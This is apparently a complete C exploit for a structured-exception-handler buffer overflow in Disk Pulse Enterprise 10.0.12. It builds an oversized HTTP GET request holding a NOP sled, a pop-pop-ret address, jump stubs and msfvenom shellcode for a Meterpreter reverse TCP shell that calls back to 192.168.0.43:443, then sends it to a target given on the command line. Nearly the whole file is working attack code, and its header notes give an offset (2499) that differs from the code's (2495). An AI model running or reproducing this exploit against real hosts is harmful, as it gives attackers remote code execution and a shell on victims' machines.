/* SEH Overflow for Disk Pulse Enterprise 10.0.12 

   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⡠⠚⡦⠊⡆⡠⢶⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣠⠃⣧⠃⣰⠁⢠⠏⢀⠎⢀⡀⢀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⠒⣧⣹⢀⣸⣄⣇⣦⠂⣠⠗⠊⢁⣠⣊⡀
⠀⠀⠀⠀⠀⠀⠀⢺⣉⠙⢂⡾⠏⠁⠀⠀⠀⠈⠹⣗⡓⠉⠁⠀⣀⠼
⠀⠀⠀⠀⠀⠄⠒⠀⠈⣓⡟⠀⠀⠀⠀⠀⠀⡀⠀⡷⢶⡖⠈⠉⠉⣢
⠀⠀⠀⠀⠀⡝⠂⢀⣚⣷⡇⠀⠀⠠⠀⠀⣄⣤⠾⠖⠠⣀⠁⠲⢌⠀
⠀⠀⠀⠀⠀⢉⠝⢉⡴⢞⡿⠶⢿⢴⡔⣿⠙⠝⡏⠢⣄⠈⠙⣕⠚⠀
⠀⠀⠀⠀⠀⠧⡴⠋⣠⠏⢠⠁⡜⢈⡇⢹⠱⡀⠘⡄⠈⢋⠐⠊⠀⠀
⠀⠀⠀⠀⠀⢰⡁⠔⡏⡠⡇⢠⠃⢸⠇⢸⢠⠓⠤⠏⠒⠚⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⣄⡎⠦⠢⢈⣸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡠⠄⠒⣂⠰⡒⠢⢄⢰⠡⠀⢀⠕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠚⠠⢅⠉⢈⢉⠳⢴⣰⣿⢖⣔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠡⢀⣀⡰⢋⡜⠻⣂⣀⠑⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡔⠡⠂⠣⡁⠉⠑⣖⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡜⠠⠁⠀⠀⠈⠢⣀⠘⢣⠂⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⢁⠇⠀⠀⠀⠀⠀⠀⠑⡄⠂⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠘⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠑⢌⣆⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀                          

Notes:
   - Offset: 2499
   - Bad Characters: 0x00, 0x09, 0x0a, 0x0d, 0x20 
   - P/P/R Address: 0x101576c0
   - JMP to Shellcode: 0x6681c4230e */

#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define SIZE 6000 
#define OFFSET 2495

/* Send payload to server */
ssize_t send_payload(int s, int payload_size, char* payload) {
	ssize_t sent = 0;
	ssize_t n = 0;
	while (sent < payload_size) {
		n = send(s, payload + sent, payload_size - sent, 0);
		if (n == -1) {
			printf("ERROR!\n");
			return 0; 
		}
		sent += n;
	}

	printf("OK!\n", sent);

	return sent;
}

/* Generate HTTP request packet including payload */
char* generate_headers(char* addr) { 
	unsigned char buffer[SIZE] = { 0 };
	
	/* msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.43 LPORT=443 -b 
	   "\x00\x09\x0a\x0d\x20" -f c -v shellcode */
	unsigned char* shellcode = 
		"\xba\x2f\x23\xa5\xc2\xdb\xc9\xd9\x74\x24\xf4\x58\x31\xc9"
		"\xb1\x59\x31\x50\x14\x03\x50\x14\x83\xc0\x04\xcd\xd6\x59"
		"\x2a\x9e\x19\xa2\xab\xc0\x90\x47\x9a\xd2\xc7\x0c\x8f\xe2"
		"\x8c\x41\x3c\x89\xc1\x71\xb7\xff\xcd\x76\x70\xb5\x2b\xb8"
		"\x81\x78\xf4\x16\x41\x1b\x88\x64\x96\xfb\xb1\xa6\xeb\xfa"
		"\xf6\x70\x81\x13\xaa\xd5\xe2\xb9\x5b\x51\xb6\x01\x5d\xb5"
		"\xbc\x39\x25\xb0\x03\xcd\x99\xbb\x53\xa6\x6a\xa4\xd8\xe0"
		"\x4a\x84\xdf\xc3\x0e\xed\x94\xdf\x21\x11\x1d\x94\x76\x66"
		"\x9f\x7c\x47\xb8\x61\x4f\xa5\x94\x63\x88\x8e\x04\x16\xe2"
		"\xec\xb9\x21\x31\x8e\x65\xa7\xa5\x28\xed\x1f\x01\xc8\x22"
		"\xf9\xc2\xc6\x8f\x8d\x8c\xca\x0e\x41\xa7\xf7\x9b\x64\x67"
		"\x7e\xdf\x42\xa3\xda\xbb\xeb\xf2\x86\x6a\x13\xe4\x6f\xd2"
		"\xb1\x6f\x9d\x05\xc5\x90\x5d\x2a\x9b\x06\x91\xe7\x24\xd6"
		"\xbd\x70\x56\xe4\x62\x2b\xf0\x44\xea\xf5\x07\xdd\xfc\x05"
		"\xd7\x65\x6c\xf8\xd8\x95\xa4\x3f\x8c\xc5\xde\x96\xad\x8e"
		"\x1e\x16\x78\x3a\x15\x80\x43\x12\x29\x7b\x2c\x60\x2a\x7e"
		"\x95\xed\xcc\xd0\xb5\xbd\x40\x91\x65\x7d\x31\x79\x6c\x72"
		"\x6e\x99\x8f\x59\x07\x30\x60\x37\x7f\xad\x19\x12\x0b\x4c"
		"\xe5\x89\x71\x4e\x6d\x3b\x85\x01\x86\x4e\x95\x76\xf1\xb0"
		"\x65\x87\x94\xb0\x0f\x83\x3e\xe7\xa7\x89\x67\xcf\x67\x71"
		"\x42\x4c\x6f\x8d\x13\x64\x1b\xb8\x81\xc8\x73\xc5\x45\xc8"
		"\x83\x93\x0f\xc8\xeb\x43\x74\x9b\x0e\x8c\xa1\x88\x82\x19"
		"\x4a\xf8\x77\x89\x22\x06\xa1\xfd\xec\xf9\x84\x7d\xea\x05"
		"\x5a\xaa\x53\x6d\xa4\xea\x63\x6d\xce\xea\x33\x05\x05\xc4"
		"\xbc\xe5\xe6\xcf\x94\x6d\x6c\x9e\x57\x0c\x71\x8b\x36\x90"
		"\x72\x38\xe3\x23\x08\x31\x14\xc4\xed\x5b\x71\xc5\xed\x63"
		"\x87\xfa\x3b\x5a\xfd\x3d\xf8\xd9\x0e\x08\x5d\x4b\x85\x72"
		"\xf1\x8b\x8c";


	int shellcode_len = strlen(shellcode);

	/* SEH Overflow variables */
	char* shortjmp = "\x90\x90\xeb\x04";
	int shortjmp_len = strlen(shortjmp);
	char* poppopret = "\xc0\x76\x15\x10";
	int poppopret_len = strlen(poppopret);
	char* jmptoshell = "\xe9\x34\xc9\xff\xff";
	int jmptoshell_len = strlen(jmptoshell);

	/* Cursor to keep track of offset in buffer */
	int cursor = OFFSET;
	
	/* Padding: 6000 - (2495 + Short JMP + P/P/R Address + NOP Sled + JMP to Shellcode +
	   NOP Sled + NULL Terminator */
	int padding = SIZE - (OFFSET + shortjmp_len + poppopret_len + 8 + jmptoshell_len + 64 + 
					  	  shellcode_len + 1);


	/* Fill buffer with offsets, padding, and shellcode */
	memset(buffer, 0x90, OFFSET);
	memcpy(buffer + cursor, shortjmp, shortjmp_len);
	cursor += shortjmp_len;
	memcpy(buffer + cursor, poppopret, poppopret_len);
	cursor += poppopret_len;
	memset(buffer + cursor, 0x90, 8);
	cursor += 8;
	memcpy(buffer + cursor, jmptoshell, jmptoshell_len);
	cursor += jmptoshell_len;
	memset(buffer + cursor, 0x90, 64);
	cursor += 64;
	memcpy(buffer + cursor, shellcode, shellcode_len);
	cursor += shellcode_len;
	memset(buffer + cursor, 0x43, padding);

	/* Build HTTP request using buffer */
	char* payload;
	asprintf(&payload, "GET /%s HTTP/1.1\r\n"
					   "Host: %s\r\n"
					   "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 "
					   "Firefox/31.0 Iceweasel/31.8.0\r\n"
					   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
					   "Accept-Language: en-US,en;q=0.5\r\n"
					   "Accept-Encoding: gzip, deflate\r\n"
					   "Connection: keep-alive\r\n\r\n", buffer, addr);
	return payload;
}

int main(int argc, char *argv[]) {
	/* Handle command-line arguments */
	if (argc < 3) {
		printf("Disk Pulse Enterprise 10.0.12 SEH Exploit\n");
		printf("Usage: IP PORT\n");
		return 1;
	}

	char* addr = argv[1];
	int port = atoi(argv[2]);
	
	/* Create a socket */
	int s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == -1) {
		printf("Failed to initialize socket!\n");
		return 1;
	}

	/* Initialize sockaddr_in */
	struct sockaddr_in target;
	target.sin_addr.s_addr = inet_addr(addr);
	target.sin_family = AF_INET;
	target.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&target, sizeof(target)) < 0) {
		printf("Failed to initialize sockaddr_in structure!\n");
		return 1;
	}

	printf("Connected to %s on port %d!\n", addr, port);

	/* Generate HTTP request header including buffer and send to remote web server */
	char* payload = generate_headers(addr);
	int payload_length = strlen(payload);
	ssize_t bytes_delivered = 0;

	if (payload != NULL) {
		printf("Sending payload ... ");
		bytes_delivered = send_payload(s, payload_length, payload);
	} else {
		printf("Failed to generate HTTP request. Exiting!\n");
		return 1;
	}

	/* Free allocated resources */
	free(payload);
	payload = NULL;

	if (bytes_delivered > 0) {
		printf("Bytes delivered ... %ld\n", bytes_delivered);
	} else {
		printf("Could not send data to server. Exiting!\n");
		return 1;
	}

	return 0;
}
